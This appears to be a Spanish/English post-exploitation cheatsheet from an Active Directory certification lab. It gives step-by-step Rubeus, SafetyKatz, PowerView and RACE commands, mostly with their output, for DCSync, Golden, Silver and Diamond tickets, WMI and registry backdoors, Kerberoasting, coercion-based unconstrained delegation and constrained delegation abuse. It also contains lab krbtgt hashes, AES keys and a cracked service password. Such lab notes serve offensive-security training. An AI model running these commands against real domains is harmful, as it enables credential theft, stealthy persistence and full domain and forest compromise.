# 🏁 Cheatsheet - Fast Commands (POST-EXPLOTATION)

| **Hash / Clave usada**      | Hash de **krbtgt** (NTLM o AES)                          | Hash de la **cuenta de máquina** del servidor (ej. dcorp-dc$) | Hash de **krbtgt** (igual que Golden)                                   |
| --------------------------- | -------------------------------------------------------- | ------------------------------------------------------------- | ----------------------------------------------------------------------- |
| **Alcance**                 | Todo el dominio                                          | Solo un servidor específico                                   | Todo el dominio                                                         |
| **Qué impersonas**          | Cualquier usuario (normalmente Administrator)            | Cualquier usuario, pero solo en ese servidor                  | Cualquier usuario + **grupos arbitrarios** en el PAC                    |
| **Modifica el PAC**         | No                                                       | No                                                            | **Sí** (puedes añadir grupos como Domain Admins)                        |
| **Duración por defecto**    | 10 años                                                  | 10 años                                                       | 10 años                                                                 |
| **Nivel de OPSEC**          | Bajo (muy ruidoso)                                       | Alto (sigiloso)                                               | Bajo (tan ruidoso como Golden)                                          |
| **Detección**               | Fácil de detectar (krbtgt TGT requests)                  | Difícil de detectar                                           | Fácil de detectar (PAC modificado + krbtgt)                             |
| **Uso principal**           | Acceso total como DA                                     | Acceso sigiloso a un servicio concreto (WinRM, WMI, etc.)     | Bypassear restricciones de grupos / RBAC                                |
| **Comando típico (Rubeus)** | `Rubeus.exe golden /user:Administrator /krbtgt:... /ptt` | `Rubeus.exe silver /service:http/... /rc4:... /ptt`           | `Rubeus.exe diamond /user:Administrator /krbtgt:... /groupsid:... /ptt` |
| **Learning Objective**      | LO8                                                      | LO9                                                           | LO10                                                                    |
| **Requiere**                | Hash de krbtgt                                           | Hash de máquina del servidor                                  | Hash de krbtgt + capacidad de modificar PAC                             |
| **Ventaja**                 | Poder total                                              | Muy sigiloso                                                  | Poder total + bypass de membresía de grupos                             |

***

## DCSync — Extract hashes with replication rights

> LO12: DCSync no requiere DA completo, solo derechos de replicación en el objeto raíz del dominio.

### Check if studentx already has replication rights

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```

### If not, add replication rights (needs DA)

> From elevated cmd, first spawn DA process:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

In the new DA cmd:

```
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
. C:\AD\Tools\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

### Run DCSync — pull krbtgt hash

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

> Key values to save:
>
> * **krbtgt NTLM**: `4e9815869d2090ccfca61c1fe0d23986`
> * **krbtgt AES256**: `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848`
> * **krbtgt SID**: `S-1-5-21-719815819-3726368948-3917688648-502`
> * **Domain SID**: `S-1-5-21-719815819-3726368948-3917688648`

***

## Golden Ticket

> Info previusly obtained:
>
> * SID: S-1-5-21-719815819-3726368948-3917688648-502
> * AES256-kgbtb: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
> * user: Administrator

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

> In us vm student console/machine

<figure><img src="../../../.gitbook/assets/image (44) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (45) (1).png" alt="" width="509"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (46) (1).png" alt=""><figcaption></figcaption></figure>

Now, It generete us a complete command to forge a Golden ticket.

`C:\AD\Tools\Loader.exe Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3247 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD`

> Remember to add `-path C:\AD\Tools\Rubeus.exe -args` after `Loader.exe` and `/ptt` at the end of the generated command to inject it in the current process.

> We need modificate a little bit the commands awarded by the previus commnad -->
>
> ```
> C:\AD\Tools\Loader.exe Evasive-Golden .....
> ```
>
> between -->
>
> ```
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden .....
> ```

Once the ticket is injected, we can access resources in the domain:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3046 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

<figure><img src="../../../.gitbook/assets/image (47) (1).png" alt=""><figcaption></figcaption></figure>

```
winrs -r:dcorp-dc cmd
```

<figure><img src="../../../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure>

***

## Silver Ticket

> Note that we are NOT using the krbtgt hash here. Using the below command, we can create a Silver Ticket that provides us access to the HTTP service (WinRM) on DC.
>
> Please note that the hash of `dcorp-dc$` (RC4 in the below command) may be different in your lab instance.
>
> We can obtaine RC4 hash from dcorp-dc$ like-->
>
> ```
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp-dc$" "exit"
> ```

> Remember! DO ALL IT from Administrator Account since SVstudent machine
>
> ```
> C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
> ```

### HTTP Service

You can also use aes256 keys in place of NTLM hash:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

<figure><img src="../../../.gitbook/assets/image (1433).png" alt=""><figcaption></figcaption></figure>

#### Verify it

We can check if we got the correct service ticket:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

<figure><img src="../../../.gitbook/assets/image (1434).png" alt=""><figcaption></figcaption></figure>

We have the HTTP service ticket for `dcorp-dc`, let’s try accessing it using `winrs`. Note that we are using FQDN of `dcorp-dc` as that is what the service ticket has:

<figure><img src="../../../.gitbook/assets/image (1436).png" alt=""><figcaption></figcaption></figure>

### WMI Service

For accessing WMI, we need to create two tickets

* one for **HOST** service
* another for **RPCSS**.

Run the below commands from an elevated shell:

#### Host service

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

> * `/service:host/...` → le dice a Kerberos que este ticket es para el servicio HOST en el DC.
> * `/ptt` → inyecta el ticket directamente en tu sesión actual (no lo guarda en disco).
> * `/ldap` → Rubeus consulta el DC y completa SID, groups, etc. automáticamente.

Now, in the same windows we pushed him to Inject a ticket for **RPCSS**:

#### **RPCSS**

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.
```

#### Verify it

Check if the tickets are present.

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

<figure><img src="../../../.gitbook/assets/image (1435).png" alt=""><figcaption></figcaption></figure>

Now, try running WMI commands on the domain controller:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../../../.gitbook/assets/image (1442).png" alt=""><figcaption></figcaption></figure>

***

## Diamond Ticket

We can simply use the following Rubeus command to execute the attack.

> Note that the command needs to be run from an elevated shell (Run as administrator).
>
> We take the usual OPSEC care of using Loader:

> Info previusly obtained:
>
> * SID: S-1-5-21-719815819-3726368948-3917688648-502
> * AES256-kgbtb: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
> * user: Administrator

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Access the DC using winrs from the new spawned process!

```
winrs -r:dcorp-dc cmd
set username
```

<figure><img src="../../../.gitbook/assets/image (66) (1).png" alt=""><figcaption></figcaption></figure>

***

## Modificar Security Descriptors de WMI y PowerShell Remoting

> 1. Abre una **cmd como Administrator** (elevada) en tu student VM (dcorp-std453).
> 2. Desde esa cmd elevada, lanza un proceso **como Domain Admin** (svcadmin) usando el ticket que ya tienes del ejercicio anterior:
>
> ```
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
> ```
>
> → Se abrirá una **nueva ventana de cmd** corriendo como **svcadmin** (Domain Admin).

### Option 1 – Enable remote WMI for studentX

Below command (to be run as Domain Administrator) modifies the host security descriptors for WMI on the DC to allow studentx access to WMI:

> Change studentX

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

<figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>

#### Check It

Now, we can execute WMI queries on the DC as studentx:

```
PS C:\AD\Tools> gwmi -class win32_operatingsystem -ComputerName dcorp-dc

SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```

### Option 2 – Enable PowerShell Remoting for student453

Similar modification can be done to PowerShell remoting configuration. (In rare cases, you may get an I/O error while using the below command, please ignore it).

> **Please note that this is unstable since some patches in August 2020**:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

Now, we can run commands using PowerShell remoting on the DC without DA privileges:

```
PS C:\AD\Tools> Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local

dcorp\studentx
```

#### Retrieve the machine account hash (dcorp-dc$) without being a local administrator

To retrieve machine account hash without DA, first we need to modify permissions on the DC. Run the below command as DA:

> Ejecuta esto también desde la sesión de svcadmin (misma ventana):

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
PS C:\AD\Tools> Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : ] Using trustee username 'studentx'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Remote registry is not running, attempting to start
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Attaching to remote registry through StdRegProv
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating ACE with Access Mask of 983103
(ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)

ComputerName                        BackdoorTrustee
------------                        ---------------
dcorp-dc.dollarcorp.moneycorp.local studentx

```

***

## Kerberoasting: Abusing Service Principal Names (SPNs) to Crack Service Account Passwords

First, we need to find services running with user accounts as the services running with machine accounts have difficult passwords.

We can use PowerView or ActiveDirectory module for discovering such services:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN
```

<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>

The `svcadmin`, which is a domain administrator has a SPN set! Let’s Kerberoast it!

> **SPN = Service Principal Name**
>
> Es un nombre único que identifica **un servicio** que corre en el dominio.
>
> Ejemplos reales del lab:
>
> * MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433 → SQL Server
> * SNMP/ufc-adminsrv.dollarcorp.moneycorp.local → servicio SNMP
> * HTTP/dcorp-dc.dollarcorp.moneycorp.local → servicio web, etc.

### Rubeus and John the Ripper

> **Regla clave:**
>
> * Solo las **cuentas de usuario** (no las de máquina) que tienen un SPN registrado pueden ser Kerberoasteadas fácilmente.
> * Las cuentas de máquina (dcorp-dc$, etc.) tienen contraseñas muy largas y aleatorias → casi imposibles de crackear.

We can use Rubeus to get hashes for the svcadmin account. Note that we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if ‘**This account supports Kerberos AES 128/256 bit encryption**’ is set for a service account, the below command will not request its hashes.

> Remember use a invishell

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1
[*] Action: Kerberoasting
[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : svcadmin
[*] Target Domain          : dollarcorp.moneycorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svcadmin)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\hashes.txt
```

We can now use John the Ripper to brute-force the hashes.

> Please note that you need to remove “**:1433**” from the SPN in hashes.txt before running John
>
> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*`
>
> should be
>
> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*`
>
> in hashes.txt

<figure><img src="../../../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure>

Run the below command after making above changes:

> It bruteforce the password of it user

```
C:\AD\Tools> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*ThisisBlasphemyThisisMadness!!  (?)
1g 0:00:00:00 DONE (2023-03-03 09:18) 90.90g/s 186181p/s 186181c/s 186181C/s energy..mollie
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

<figure><img src="../../../.gitbook/assets/image (40) (1).png" alt=""><figcaption></figcaption></figure>

`svcadmin:*ThisisBlasphemyThisisMadness!!`

***

## Unconstrained Delegation + Coercion Attacks

First, we need to find a server that has unconstrained delegation enabled:

### Search server with (unconstrained delegation)

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

<figure><img src="../../../.gitbook/assets/image (41) (1).png" alt=""><figcaption></figcaption></figure>

Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv.

> Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv.

Let’s check if anyone of them have local admin privileges on dcorp-appsrv.

### Check local admins in dcorp-appsrv

> To that, we will need to check all users and hashes previusly obtained
>
> Like for example appadmin

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Run the below commands in the new process:

```
C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\Windows\system32> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
dcorp-appsrv
dcorp-adminsrv
```

Sweet! We now have admin <mark style="background-color:yellow;">access to the machine that has unconstrained delegation.</mark>

### Execute Rubeus using Loader and winrs

Run the below command from the process running appadmin:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```

Run Rubeus in listener mode in the winrs session on dcorp-appsrv:

> Connect to the machine dcorp-appsrv

```
C:\Windows\system32> winrs -r:dcorp-appsrv cmd
```

After obtaining a cmd, do the portforward

```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\appadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.53
```

> Remember change the IP
>
> > Remember upload too the Rubeus to us webserver
> >
> > <img src="../../../.gitbook/assets/image (42) (1).png" alt="" data-size="original">

Execute Rubeus

```
C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap

  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  V2.2.1

[*] Action: TGT Monitoring
[*] Target user     : DCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```

> * Deja la ventana de winrs en dcorp-appsrv **abierta** con el monitor de Rubeus corriendo.
> * Abre **otra cmd** en tu máquina student.
> * Ejecuta el comando de Printer Bug de arriba.

#### Option 1 - Use the Printer Bug for Coercion

<mark style="background-color:yellow;">On the student VM</mark>, use MS-RPRN to force authentication from dcorp-dc$ (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required)

```
C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

#### **Option 2 – Windows Search Protocol**

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```

#### **Option 3 – DFS Namespace**

```
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

### Optain the TGT

After execute some of these options, on the Rubeus listener (dcorp-appsrv), we can see the TGT of dcorp-dc$:

```
[*] Monitoring every 5 seconds for new TGTs

[*] 3/3/2023 5:22:53 PMPM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  3/3/2023 2:16:37 AM
  EndTime               :  3/3/2023 12:15:31 PM
  RenewTill             :  3/10/2023 2:15:31 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFxTCC..

[snip]
```

<figure><img src="../../../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:yellow;">Copy the base64 encoded ticket and use it with Rubeus on student VM.</mark>

### Importar the ticket and do DCSync (Domain Admin)

Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…
[snip]
[*] Action: Import Ticket
[+] Ticket successfully imported!
```

> Remember replace the ticket ... to base64 previusly getting

Now, we can run DCSync from this process:

> All it from VM machine

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

[snip]

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 9:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e

[snip]
```

Great!

### Escalada a Enterprise Admin (repetición contra mcorp-dc)

To get Enterprise Admin privileges, we need to force authentication from `mcorp-dc`.

> Repite los mismos pasos pero ahora contra mcorp-dc$:

Run the below command to listen for `mcorp-dc$` tickets on `dcorp-appsrv`:

```
C:\Windows\system32> winrs -r:dcorp-appsrv cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap

C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
  ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  V2.2.1

[*] Action: TGT Monitoring
[*] Target user     : MCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```

Use MS-RPRN on the student VM to trigger authentication from `mcorp-dc` to `dcorp-appsrv`:

```
C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

> **Alternatively**, we can also use MS-DFSNM or MS-WSP (note that we are not using FQDN of mcorp-dc in case of WSPCoerce):
>
> ```
> C:\AD\Tools> C:\AD\Tools\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local
>
> C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local
> ```

On the Rubeus listener, we can see the TGT of mcorp-dc$:

```
[*] Monitoring every 5 seconds for new TGTs

[*] 3/3/2023 5:32:23 PM UTC - Found new TGT:

  User                  :  MCORP-DC$@MONEYCORP.LOCAL

[snip]
```

As previously, copy the base64 encoded ticket and use it with Rubeus on student VM. Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…
[snip]
[*] Action: Import Ticket
[+] Ticket successfully imported!

Now, we can run DCSync from this process:

C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

[snip]
```

Awesome ! We escalated to Enterprise Admins too!

***

## Abusing Constrained Delegation (S4U2Self + S4U2Proxy)

### Enumerate Users with Constrained Delegation

```
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -TrustedToAuth
```

<figure><img src="../../../.gitbook/assets/image (1441).png" alt=""><figcaption></figcaption></figure>

> websvc → Tiene Constrained Delegation hacia CIFS/dcorp-mssql.dollarcorp.moneycorp.local

And we already have secrets/tgt of websvc from dcorp-admisrv machine. We can use Rubeus to abuse that.

### Abuse Constrained Delegation using websvc with Rubeus

In the below command, we request a TGS for websvc as the Domain Administrator - Administrator. Then the TGS used to access the service specified in the `/msdsspn` parameter (which is filesystem on dcorp-mssql):

> * Pide un TGT para websvc
> * Hace **S4U2Self** → se hace pasar por Administrator
> * Hace **S4U2Proxy** → obtiene un ticket para el servicio CIFS en dcorp-mssql
> * Usa /msdsspn para especifcar el path
> * Inyecta el ticket con /ptt

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

v2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFSjCCBUagAwIBBaED [snip]

[*] Action: S4U

[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      doIGHDCCBhigAwIBBaED [snip]

[+] Ticket successfully imported!
[*] Impersonating user 'Administrator' to target SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Building S4U2proxy request for service: 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL':

      doIHYzCCB1+gAwIBBaED [snip]

[+] Ticket successfully imported!
```

Check if the TGS is injected:

```
C:\AD\Tools> klist

Current LogonId is 0:0x1184e6d

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
[snip]
```

Try accessing filesystem on dcorp-mssql:

```
C:\AD\Tools> dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$

Volume in drive \\dcorp-mssql.dollarcorp.moneycorp.local\c$ has no label.
 Volume Serial Number is 98C0-23AE

